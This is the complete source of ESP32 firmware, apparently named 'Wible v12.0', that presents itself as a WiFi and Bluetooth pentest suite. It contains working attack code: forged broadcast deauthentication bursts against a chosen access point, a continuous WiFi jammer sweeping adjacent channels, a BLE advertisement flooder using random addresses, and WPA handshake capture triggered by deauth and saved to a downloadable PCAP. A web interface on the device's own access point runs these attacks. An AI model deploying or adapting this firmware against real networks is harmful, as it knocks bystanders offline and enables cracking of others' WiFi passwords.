/*
Wible - ver12.0 2026 by YouKnowMeRight - ESP32 WiFi + Bluetooth Pentest Suite 
ALL 4 ATTACKS: Deauth + WiFi Jam + BLE Spam + Handshake Capture
TARGETED DUMP TRUCK + FCS/MALFORMED PACKET CORRECTION
*/

#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_system.h"
#include "nvs_flash.h"
#include "esp_timer.h"
#include <WebServer.h>
#include <WiFi.h>
#include <SPIFFS.h>
#include <FS.h>
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"

// === PCAP STRUCTURES ===
#define PCAP_SNAPLEN 512
typedef struct {
    uint32_t micro_ts;
    uint16_t orig_len;
    uint16_t incl_len;
    uint8_t payload[PCAP_SNAPLEN];
} pcap_packet_t;

QueueHandle_t pcap_queue;
File pcapFile;

// === ATTACK STATUS ===
typedef enum { READY, RUNNING, FINISHED, TIMEOUT } attack_state_t;
typedef enum { 
    ATTACK_TYPE_NONE = 0, 
    ATTACK_TYPE_HANDSHAKE = 2, 
    ATTACK_TYPE_DEAUTH = 3, 
    ATTACK_TYPE_BLUETOOTH_JAM = 4,
    ATTACK_TYPE_WIFI_JAM = 5 
} attack_type_t;

typedef struct {
    attack_state_t state;
    attack_type_t type;
} attack_status_t;

static attack_status_t attack_status = { READY, ATTACK_TYPE_NONE };
static esp_timer_handle_t attack_timer;
static uint64_t attack_end_time = 0;

// === AP TARGET ===
typedef struct {
    uint8_t bssid[6];
    uint8_t ssid[33];
    uint8_t channel;
    int8_t rssi;
    uint32_t last_seen;
} ap_record_t;

#define MAX_APS 64
ap_record_t aps[MAX_APS];
uint8_t ap_count = 0;
uint8_t selected_ap = 0;

// === GLOBALS ===
WebServer server(80);
static const char* TAG = "wible12.0";
volatile bool sniffer_active = false;
uint32_t packets = 0;
uint32_t eapol_captured = 0;
bool bt_jamming_active = false;
bool wifi_jamming_active = false;

// === WIFI JAMMER TASK ===
void wifi_jammer_task(void *pvParameters) {
    uint8_t jam_packets[3][26] = {
        {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x07, 0x00},
        {0xB0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x07, 0x00},
        {0x40, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x07, 0x00}
    };
    
    while (1) {
        if (wifi_jamming_active && selected_ap < ap_count && attack_status.state != RUNNING) {
            for (int ch_offset = -2; ch_offset <= 2; ch_offset++) {
                int target_ch = aps[selected_ap].channel + ch_offset;
                if (target_ch < 1 || target_ch > 13) continue;
                
                esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
                
                for (int pkt_type = 0; pkt_type < 3; pkt_type++) {
                    memcpy(jam_packets[pkt_type] + 10, aps[selected_ap].bssid, 6);
                    memcpy(jam_packets[pkt_type] + 16, aps[selected_ap].bssid, 6);
                    esp_wifi_80211_tx(WIFI_IF_STA, jam_packets[pkt_type], 26, false);
                }
                vTaskDelay(pdMS_TO_TICKS(1));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// === BLUETOOTH ADVERTISEMENT FLOODER TASK ===
void bluetooth_jammer_task(void *pvParameters) {
    esp_ble_adv_params_t adv_params = {
        .adv_int_min        = 0x20,
        .adv_int_max        = 0x40,
        .adv_type           = ADV_TYPE_NONCONN_IND,
        .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
        .channel_map        = ADV_CHNL_ALL,
        .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };

    while (1) {
        if (bt_jamming_active) {
            esp_ble_gap_stop_advertising();
            
            uint8_t rand_mac[6];
            for (int i = 0; i < 6; i++) rand_mac[i] = esp_random() % 256;
            rand_mac[0] |= 0xC0; 
            esp_ble_gap_set_rand_addr(rand_mac);

            uint8_t jam_packet[31];
            for (int i = 0; i < 31; i++) jam_packet[i] = esp_random() % 256;
            jam_packet[0] = 30;
            jam_packet[1] = 0xFF;

            esp_ble_gap_config_adv_data_raw(jam_packet, 31);
            esp_ble_gap_start_advertising(&adv_params);
            
            vTaskDelay(pdMS_TO_TICKS(50)); 
        } else {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
}

// === PCAP WRITER TASK ===
void pcap_writer_task(void *pvParameters) {
    pcap_packet_t pkt;
    while(1) {
        if (xQueueReceive(pcap_queue, &pkt, portMAX_DELAY) == pdTRUE) {
            if (attack_status.state == RUNNING && attack_status.type == ATTACK_TYPE_HANDSHAKE && pcapFile) {
                uint32_t ts_sec = pkt.micro_ts / 1000000;
                uint32_t ts_usec = pkt.micro_ts % 1000000;
                uint32_t incl_len = pkt.incl_len;
                uint32_t orig_len = pkt.orig_len;

                pcapFile.write((uint8_t*)&ts_sec, 4);
                pcapFile.write((uint8_t*)&ts_usec, 4);
                pcapFile.write((uint8_t*)&incl_len, 4);
                pcapFile.write((uint8_t*)&orig_len, 4);
                pcapFile.write(pkt.payload, incl_len);
            }
        }
    }
}

// === ATTACK TIMER ===
void attack_init() {
    esp_timer_create_args_t timer_args = {};
    timer_args.callback = [](void* arg) {
        ESP_LOGI(TAG, "ATTACK FINISHED");
        attack_status.state = FINISHED;
        if (pcapFile) {
            pcapFile.close();
            ESP_LOGI(TAG, "PCAP File Saved to SPIFFS.");
        }
    };
    timer_args.name = "attack_timeout";
    esp_timer_create(&timer_args, &attack_timer);
}

// === REAL SNIFFER (TARGETED DUMP TRUCK + MALFORMED FIX) ===
void IRAM_ATTR wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!sniffer_active && attack_status.state != RUNNING) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    
    // DROP CORRUPTED FRAMES: If the hardware flags an RF error, drop it to prevent Wireshark garbage
    if (pkt->rx_ctrl.rx_state != 0) return;

    uint8_t* frame = pkt->payload;
    uint16_t sig_len = pkt->rx_ctrl.sig_len;
    
    if (sig_len < 24) return;
    
    // FCS STRIP: The ESP32 often includes the 4-byte Frame Check Sequence in sig_len but drops the bytes.
    // Subtracting 4 tells Wireshark exactly where the payload actually ends, fixing "Malformed Packet".
    if (sig_len > 4) {
        sig_len -= 4;
    }
    
    if (attack_status.state == RUNNING || sniffer_active) {
        packets++;
    }

    if (attack_status.state == RUNNING && attack_status.type == ATTACK_TYPE_HANDSHAKE) {
        // TARGETED DUMP: Only write frames that physically involve our target AP to the PCAP
        bool matches_target = (memcmp(frame+4, aps[selected_ap].bssid, 6) == 0 ||
                               memcmp(frame+10, aps[selected_ap].bssid, 6) == 0 ||
                               memcmp(frame+16, aps[selected_ap].bssid, 6) == 0);

        if (matches_target) {
            if (uxQueueSpacesAvailable(pcap_queue) > 0) {
                pcap_packet_t q_pkt;
                q_pkt.micro_ts = esp_timer_get_time();
                q_pkt.orig_len = sig_len;
                q_pkt.incl_len = (sig_len > PCAP_SNAPLEN) ? PCAP_SNAPLEN : sig_len;
                memcpy(q_pkt.payload, frame, q_pkt.incl_len);
                xQueueSendFromISR(pcap_queue, &q_pkt, NULL);
            }

            // Best-effort UI counter for Data frames containing potential EAPOL
            if ((frame[0] & 0x0C) == 0x08) {
                for (int i = 24; i < 64 && i < sig_len - 1; i++) {
                    if (frame[i] == 0x88 && frame[i+1] == 0x8E) {
                        eapol_captured++;
                        break;
                    }
                }
            }
        }
    }
}

// === HEAVY DEAUTH BURST ===
void trigger_deauth_burst(int count) {
    uint8_t deauth[26] = {
        0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x07, 0x00
    };
    memcpy(deauth + 10, aps[selected_ap].bssid, 6);
    memcpy(deauth + 16, aps[selected_ap].bssid, 6);
    
    for (int i = 0; i < count; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
        vTaskDelay(pdMS_TO_TICKS(2));
    }
}

// === ATTACK EXECUTOR ===
void execute_attack(uint8_t type, uint8_t ap_idx, uint32_t duration_sec) {
    if (ap_idx >= ap_count && type != ATTACK_TYPE_BLUETOOTH_JAM) return;
    
    // Strict Coexistence Rule: Shut down interference when capturing
    if (type == ATTACK_TYPE_HANDSHAKE) {
        wifi_jamming_active = false;
        bt_jamming_active = false;
        esp_ble_gap_stop_advertising();
    }
    
    // Ensure promiscuous mode is physically on
    esp_wifi_set_promiscuous(true);
    
    attack_status.type = (attack_type_t)type;
    attack_status.state = RUNNING;
    eapol_captured = 0;
    packets = 0;
    
    if (type == ATTACK_TYPE_HANDSHAKE) {
        esp_wifi_set_channel(aps[ap_idx].channel, WIFI_SECOND_CHAN_NONE);
        pcapFile = SPIFFS.open("/cap.pcap", FILE_WRITE);
        if (pcapFile) {
            uint8_t global_hdr[] = {0xd4, 0xc3, 0xb2, 0xa1, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x69, 0x00, 0x00, 0x00};
            pcapFile.write(global_hdr, 24);
        }
        trigger_deauth_burst(3); 
    } else if (type == ATTACK_TYPE_DEAUTH) {
        esp_wifi_set_channel(aps[ap_idx].channel, WIFI_SECOND_CHAN_NONE);
        trigger_deauth_burst(50); 
    } else if (type == ATTACK_TYPE_WIFI_JAM) {
        wifi_jamming_active = true;
    } else if (type == ATTACK_TYPE_BLUETOOTH_JAM) {
        bt_jamming_active = true;
    }
    
    uint64_t duration_us = (uint64_t)duration_sec * 1000000ULL;
    attack_end_time = esp_timer_get_time() + duration_us;
    esp_timer_start_once(attack_timer, duration_us);
}

// === WEB HANDLERS ===
void handleAPs() {
    String json = "[";
    for (int i = 0; i < ap_count; i++) {
        if (i) json += ",";
        char bssid[18];
        sprintf(bssid, "%02X:%02X:%02X:%02X:%02X:%02X", aps[i].bssid[0],aps[i].bssid[1],aps[i].bssid[2],aps[i].bssid[3],aps[i].bssid[4],aps[i].bssid[5]);
        json += "{\"id\":" + String(i) + ",\"bssid\":\"" + String(bssid) + "\",\"ssid\":\"" + String((char*)aps[i].ssid) + "\",\"ch\":" + String(aps[i].channel) + ",\"rssi\":" + String(aps[i].rssi) + "}";
    }
    json += "]";
    server.send(200, "application/json", json);
}

void handleStatus() {
    int time_left = 0;
    if (attack_status.state == RUNNING) {
        int64_t now = esp_timer_get_time();
        if (attack_end_time > now) time_left = (attack_end_time - now) / 1000000ULL;
    }
    
    String state_str = "READY";
    if (attack_status.state == RUNNING) state_str = "RUNNING";
    else if (attack_status.state == FINISHED) state_str = "FINISHED";

    String json = "{\"state\":\"" + state_str + "\",\"aps\":" + String(ap_count) + ",\"time_left\":" + String(time_left) + ",\"pkts\":" + String(packets) + ",\"eapols\":" + String(eapol_captured) + ",\"bt_jam\":" + String(bt_jamming_active ? 1 : 0) + "}";
    server.send(200, "application/json", json);
}

void handleDownload() {
    if (!SPIFFS.exists("/cap.pcap")) {
        server.send(404, "text/plain", "No capture file found.");
        return;
    }
    File f = SPIFFS.open("/cap.pcap", FILE_READ);
    server.sendHeader("Content-Disposition", "attachment; filename=\"handshake_capture.pcap\"");
    server.streamFile(f, "application/octet-stream");
    f.close();
}

// === CLEAN HTML UI WITH WIFI + BLUETOOTH SECTION ===
const char PROGMEM index_html[] = R"rawliteral(
<!DOCTYPE html><html><head><title>Wible - ver12.0</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f5f7; color: #333; margin: 0; padding: 20px; }
    .container { max-width: 600px; margin: 0 auto; }
    h1 { font-size: 22px; color: #2c3e50; text-align: center; margin-bottom: 20px; }
    .card { background: #fff; border-radius: 10px; padding: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 15px; }
    .status-bar { display: flex; justify-content: space-between; font-size: 14px; color: #7f8c8d; font-weight: 500; margin-bottom: 15px; }
    
    .btn { display: block; width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; transition: 0.2s; color: #fff; }
    .btn-primary { background: #3498db; }
    .btn-primary:hover { background: #2980b9; }
    .btn-danger { background: #e74c3c; }
    .btn-danger:hover { background: #c0392b; }
    .btn-success { background: #2ecc71; }
    .btn-success:hover { background: #27ae60; }
    .btn-secondary { background: #95a5a6; }
    .btn-secondary:hover { background: #7f8c8d; }
    .btn-warning { background: #f39c12; }
    .btn-warning:hover { background: #e67e22; }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; }

    .target-box { background: #e8f4f8; border: 1px solid #bce0ee; padding: 12px; border-radius: 6px; margin-bottom: 15px; text-align: center; display: none; }
    .target-box h3 { margin: 0 0 5px 0; font-size: 16px; color: #2980b9; }
    .target-box p { margin: 0; font-size: 13px; color: #555; }

    #aps { max-height: 250px; overflow-y: auto; border: 1px solid #eee; border-radius: 6px; margin-bottom: 15px; }
    .ap-item { padding: 12px; border-bottom: 1px solid #eee; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
    .ap-item:last-child { border-bottom: none; }
    .ap-item:hover { background: #f9f9f9; }
    .ap-item.selected { background: #e8f4f8; border-left: 4px solid #3498db; }
    .ap-info { display: flex; flex-direction: column; }
    .ap-ssid { font-weight: 600; font-size: 15px; }
    .ap-mac { font-size: 12px; color: #7f8c8d; font-family: monospace; }
    .ap-stats { text-align: right; font-size: 13px; color: #95a5a6; }
    
    .flex-row { display: flex; gap: 10px; margin: 8px 0; }
    .time-select { flex: 1; padding: 10px; border-radius: 6px; border: 1px solid #ccc; font-size: 14px; outline: none; background: #fff;}
    .flex-btn { flex: 2; margin: 0; }
    
    .bt-section { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 8px; margin-top: 10px; }
    .bt-status { font-weight: bold; color: #856404; font-size: 14px; margin-bottom: 10px; }
</style>
</head><body>
<div class="container">
    <h1>Wible - ver12.0 2026 by <span style="color:red;">YouKnowMeRight</span></h1>
    
    <div class="card">
        <div class="status-bar">
            <span id="stateText">Status: READY</span>
            <span id="pkts">0 EAPOLs | 0 Pkts</span>
        </div>
        <button class="btn btn-primary" id="scanBtn" onclick="toggleSniff()">START SCANNER</button>
    </div>

    <div class="card">
        <div id="target-ui" class="target-box">
            <h3 id="target-title">Target Locked</h3>
            <p id="target-details">None Selected</p>
        </div>
        
        <div id="aps" style="display:none;"></div>
        
        <div class="flex-row">
            <button class="btn btn-danger attack-btn flex-btn" id="dosBtn" onclick="startAttack(3)" disabled>Deauth Burst</button>
            <button class="btn btn-warning attack-btn flex-btn" id="wifiJamBtn" onclick="startAttack(5)" disabled>WiFi Jam (Cont.)</button>
        </div>
        
        <div class="flex-row">
            <select id="capTime" class="time-select attack-btn" disabled>
                <option value="30">30 Seconds</option>
                <option value="60">60 Seconds</option>
                <option value="120">120 Seconds</option>
            </select>
            <button class="btn btn-primary flex-btn attack-btn" id="capBtn" onclick="startCapture()" disabled>Capture Handshake</button>
        </div>

        <button class="btn btn-success" id="dlBtn" onclick="window.location.href='/download';" disabled style="margin-top:15px;">Download PCAP</button>
    </div>

    <div class="card">
        <h3 style="margin-top:0; color:#e67e22;">Bluetooth/BLE Jammer</h3>
        <div class="bt-section">
            <div class="bt-status" id="btStatus">Status: STOPPED</div>
            <div class="flex-row">
                <select id="btTime" class="time-select" style="flex:1;">
                    <option value="30">30 Seconds</option>
                    <option value="60">60 Seconds</option>
                    <option value="120">120 Seconds</option>
                </select>
                <button class="btn btn-warning flex-btn" id="btStartBtn" onclick="startBTJam()">START JAMMER</button>
            </div>
            <button class="btn btn-secondary" id="btStopBtn" onclick="stopBTJam()" style="margin-top:10px;" disabled>STOP JAMMER</button>
        </div>
    </div>

    <div class="card">
        <button class="btn btn-secondary" onclick="stopAttack()" style="margin-top:15px;">Stop All Actions</button>
    </div>
</div>

<script>
let sniffing=false, selected=-1;

function update(){
    fetch('/status').then(r=>r.json()).then(d=>{
        document.getElementById('pkts').innerText = d.eapols + ' EAPOLs | ' + d.pkts + ' Pkts';
        
        if (d.state === "RUNNING") {
            document.getElementById('stateText').innerHTML = `<span style="color:#e74c3c;font-weight:bold;">Attacking/Capturing... ${d.time_left}s</span>`;
            document.getElementById('dlBtn').disabled = true;
            document.getElementById('dlBtn').innerText = "Capturing Data...";
        } else if (d.state === "FINISHED") {
            document.getElementById('stateText').innerHTML = `<span style="color:#2ecc71;font-weight:bold;">Capture Complete!</span>`;
            document.getElementById('dlBtn').disabled = false;
            document.getElementById('dlBtn').innerText = "Download PCAP";
        } else {
            document.getElementById('stateText').innerText = 'Status: READY';
        }
        
        let btStatus = document.getElementById('btStatus');
        if (d.bt_jam) {
            btStatus.innerHTML = `<span style="color:#e74c3c;font-weight:bold;">Jamming Active (${d.time_left}s left)</span>`;
            document.getElementById('btStartBtn').disabled = true;
            document.getElementById('btStopBtn').disabled = false;
        } else {
            btStatus.innerHTML = 'Status: STOPPED';
            document.getElementById('btStartBtn').disabled = false;
            document.getElementById('btStopBtn').disabled = true;
        }
    }).catch(e => console.log("Status fetch error"));
}

function loadAPs(){
    if(!sniffing && selected === -1) return;
    fetch('/aps').then(r=>r.json()).then(d=>{
        let html=''; 
        d.forEach((ap,i)=>{
            html+=`<div class="ap-item ${i==selected?'selected':''}" onclick="selectAP(${i}, '${ap.ssid||'Hidden'}', '${ap.bssid}', ${ap.ch})">
                <div class="ap-info"><span class="ap-ssid">${ap.ssid||'Hidden'}</span><span class="ap-mac">${ap.bssid}</span></div>
                <div class="ap-stats">Ch ${ap.ch}<br>${ap.rssi} dBm</div></div>`;
        }); 
        if(d.length > 0) { document.getElementById('aps').innerHTML=html; document.getElementById('aps').style.display='block'; }
    });
}

function toggleSniff(){
    sniffing=!sniffing;
    document.getElementById('scanBtn').innerText = sniffing ? "SCANNING... PLEASE WAIT" : "START SCANNER";
    document.getElementById('scanBtn').className = sniffing ? "btn btn-danger" : "btn btn-primary";
    
    fetch('/scan/'+(sniffing?'on':'off')).then(() => {
        if(sniffing) {
            document.getElementById('scanBtn').innerText = "STOP SCANNER";
            loadAPs();
        }
    }); 
}

function selectAP(i, ssid, mac, ch){
    selected=i;
    document.getElementById('target-ui').style.display = 'block';
    document.getElementById('target-details').innerHTML = `<b>${ssid}</b><br>${mac} (Channel ${ch})`;
    document.querySelectorAll('.attack-btn').forEach(b=>b.disabled=false);
    document.getElementById('dlBtn').disabled = true;
    document.getElementById('dlBtn').innerText = "Download PCAP";
    loadAPs(); 
}

function startCapture() {
    if(selected>=0) {
        let duration = document.getElementById('capTime').value;
        document.querySelectorAll('.attack-btn').forEach(b=>b.disabled=true);
        fetch(`/attack?type=2&target=${selected}&duration=${duration}`)
        .then(()=>console.log('Handshake Capture Started'));
    }
}

function startAttack(type){
    if(selected>=0) {
        let duration = (type === 5) ? 120 : 10; 
        fetch(`/attack?type=${type}&target=${selected}&duration=${duration}`)
        .then(()=>console.log('Attack Started'));
    }
}

function startBTJam() {
    let duration = document.getElementById('btTime').value;
    fetch(`/attack?type=4&target=0&duration=${duration}`)
    .then(()=>console.log('Bluetooth Jammer Started'));
}

function stopBTJam() {
    fetch('/btstop');
}

function stopAttack(){
    fetch('/stop');
    document.querySelectorAll('.attack-btn').forEach(b=>b.disabled=false);
    document.getElementById('dlBtn').disabled = true;
    document.getElementById('dlBtn').innerText = "Download PCAP";
    document.getElementById('stateText').innerText = 'Status: READY';
    document.getElementById('btStartBtn').disabled = false;
    document.getElementById('btStopBtn').disabled = true;
}

setInterval(update,1000); 
setInterval(loadAPs,2500); 
update();
</script>
</body></html>
)rawliteral";

// === setup() ===
void setup() {
    Serial.begin(115200);
    nvs_flash_init();
    
    if (!SPIFFS.begin(true)) {
        ESP_LOGE(TAG, "SPIFFS Mount Failed");
    }

    // Queue size kept at 16 to maintain memory stability
    pcap_queue = xQueueCreate(16, sizeof(pcap_packet_t));
    xTaskCreate(pcap_writer_task, "pcap_writer", 4096, NULL, 5, NULL);
    xTaskCreate(bluetooth_jammer_task, "bt_jammer", 4096, NULL, 5, NULL);
    xTaskCreate(wifi_jammer_task, "wifi_jammer", 6144, NULL, 6, NULL);
    
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP("Wible-v12.0");
    esp_wifi_set_promiscuous(true);

    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
    esp_wifi_set_promiscuous_filter(&filter);

    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_cb);
    
    esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
    
    attack_init();
    
    server.on("/", [](){ server.send_P(200, "text/html", index_html); });
    server.on("/aps", handleAPs);
    server.on("/status", handleStatus);
    
    server.on("/scan/on", [](){ 
        esp_wifi_set_promiscuous(false); 
        
        int n = WiFi.scanNetworks(false, true); 
        for (int i = 0; i < n && ap_count < MAX_APS; i++) {
            uint8_t* bssid = WiFi.BSSID(i);
            bool found = false;
            for (int j = 0; j < ap_count; j++) {
                if (memcmp(aps[j].bssid, bssid, 6) == 0) {
                    aps[j].rssi = WiFi.RSSI(i);
                    found = true;
                    break;
                }
            }
            if (!found) {
                memcpy(aps[ap_count].bssid, bssid, 6);
                String ssid_str = WiFi.SSID(i);
                int len = ssid_str.length();
                if(len > 32) len = 32;
                memcpy(aps[ap_count].ssid, ssid_str.c_str(), len);
                aps[ap_count].ssid[len] = 0;
                aps[ap_count].rssi = WiFi.RSSI(i);
                aps[ap_count].channel = WiFi.channel(i);
                aps[ap_count].last_seen = millis();
                ap_count++;
            }
        }
        WiFi.scanDelete();
        
        esp_wifi_set_promiscuous(true);
        wifi_promiscuous_filter_t f;
        f.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
        esp_wifi_set_promiscuous_filter(&f);

        sniffer_active = true; 
        server.send(200, "text/plain", "SCAN ON"); 
    });

    server.on("/scan/off", [](){ sniffer_active=false; server.send(200,"text/plain","SCAN OFF"); });
    
    server.on("/attack", []() {
        if (server.hasArg("type") && server.hasArg("target")) {
            uint32_t duration = server.hasArg("duration") ? server.arg("duration").toInt() : 30;
            execute_attack(server.arg("type").toInt(), server.arg("target").toInt(), duration);
            server.send(200, "text/plain", "OK");
        }
    });
    
    server.on("/download", handleDownload);
    server.on("/btstop", [](){ 
        bt_jamming_active = false; 
        esp_ble_gap_stop_advertising();
        server.send(200,"text/plain","BT JAM STOPPED"); 
    });
    server.on("/wifijamstop", [](){ 
        wifi_jamming_active = false; 
        server.send(200,"text/plain","WIFI JAM STOPPED"); 
    });
    server.on("/stop", [](){ 
        attack_status.state=READY; 
        bt_jamming_active = false;
        wifi_jamming_active = false;
        esp_timer_stop(attack_timer);
        esp_ble_gap_stop_advertising();
        if(pcapFile) pcapFile.close(); 
        server.send(200,"text/plain","STOPPED"); 
    });
    
    server.begin();
    ESP_LOGI(TAG, "Wible v12.0 - FCS CORRECTION AND TARGETED DUMP ENABLED");
}

void loop() {
    server.handleClient();
    delay(2);
}